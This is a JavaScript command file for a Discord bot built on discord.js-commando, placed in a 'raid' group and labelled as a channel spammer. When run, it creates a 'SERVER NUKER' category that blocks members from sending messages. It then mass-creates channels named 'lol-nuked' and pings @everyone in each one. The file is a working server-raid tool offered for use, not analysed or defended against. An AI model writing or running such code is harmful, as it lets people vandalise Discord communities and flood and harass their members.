const Commando = require('discord.js-commando')
const Discord = require('discord.js')

module.exports = class TextChannelCommand extends Commando.Command{
    constructor(client) {
        super(client, {
            name: 'textchannel',
            memberName: 'textchannel',
            group: 'raid',
            description: 'Spams text channels',
            argsType: 'multiple',
            guildOnly: true
        })
    }

    async run(message, args){
        message.delete()
        if(!args[0]){
            message.channel.send('Enter a valid number!')
            return
        }

        const count = args[0]

        let categoryId = ''
        message.guild.channels.create('SERVER NUKER', {type: 'category'}).then(channel => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['SEND_MESSAGES'],
                    allow: ['ADD_REACTIONS', 'READ_MESSAGE_HISTORY', 'VIEW_CHANNEL']
                }
            ])
        })

        for(let i=1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('lol-nuked', {
                    type: 'text',
                    parent: categoryId,
                    topic: 'Epic nuker bot'
                }).then(channel => {
                    channel.send(`||@everyone||\nU r nuked!`)
                })
            }, 1000)
        }
    }
}